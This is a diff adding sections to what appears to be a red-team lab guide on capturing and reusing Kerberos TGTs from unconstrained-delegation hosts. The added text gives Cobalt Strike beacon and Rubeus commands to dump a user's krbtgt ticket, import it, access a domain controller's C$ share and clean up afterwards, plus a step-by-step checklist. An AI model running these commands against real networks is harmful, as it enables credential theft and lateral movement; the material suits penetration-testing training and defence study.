@@ -76,6 +76,36 @@ beacon> ls \\lon-dc-1\c$
 
 The TGT allows requests for service tickets as `dyork`; access still depends on that account's permissions. The fake network-only password does not authenticate the user on its own.
 
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token CONTOSO\dyork FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
+beacon> run klist
+beacon> ls \\lon-dc-1\c$
+```
+
+```shell
+# Rubeus Alternative
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:dyork /password:FakePass /ticket:<BASE64_TICKET>
+beacon> steal_token <CREATED_PID>
+beacon> run klist
+beacon> ls \\lon-dc-1\c$
+```
+
+```shell
+# BOF session cleanup: run while the disposable session is selected.
+beacon> krb_purge
+beacon> rev2self
+# Rubeus createnetonly path only: terminate its disposable process.
+beacon> kill <CREATED_PID>
+```
+
 ## 5. Cleanup and troubleshooting
 
 ```shell
@@ -92,6 +122,38 @@ Remove the exported `.kirbi` when no longer needed. Stop any monitor job using i
 | Other LUIDs cannot be read | Elevation and access to the ticket cache |
 | Access denied after import | Client identity, resource permissions, hostname and selected session |
 | Ticket rejected | Expiration, clock synchronization, realm and complete base64 material |
+
+## Quick checklist
+
+```text
+ENUMERATE AND CAPTURE
+[ ] Identify TRUSTED_FOR_DELEGATION (UAC bit 524288) and distinguish member servers from DCs.
+[ ] Obtain elevated access to the selected delegation host.
+[ ] Confirm that the intended client can authenticate using Kerberos and delegate.
+[ ] krb_triage -> select the user, LUID and krbtgt ticket.
+[ ] krb_dump /user:dyork /service:krbtgt -> retain the complete TGT.
+[ ] Rubeus alternative: dump /luid:<LUID> /service:krbtgt /nowrap.
+[ ] If waiting for a new authentication, use monitor and record its JID.
+[ ] Verify client identity, session material, expiration and actual resource permissions.
+
+IMPORT AND VERIFY — CHOOSE ONE PATH
+# OPSEC Alternative
+[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<DYORK_TGT_BASE64>"))
+[ ] make_token CONTOSO\dyork FakePass
+[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
+# Rubeus Alternative
+[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:<DYORK_TGT_BASE64>
+[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
+[ ] run klist -> verify the selected session, client identity, target and expiry.
+[ ] ls \\lon-dc-1\c$ -> verify actual service authorization.
+
+CLEANUP
+[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
+[ ] rev2self -> restore the original token.
+[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
+[ ] If a monitor was started: jobs, then jobkill <MONITOR_JID>.
+[ ] Remove the exported .kirbi file when no longer needed.
+```
 
 ## Related references
 
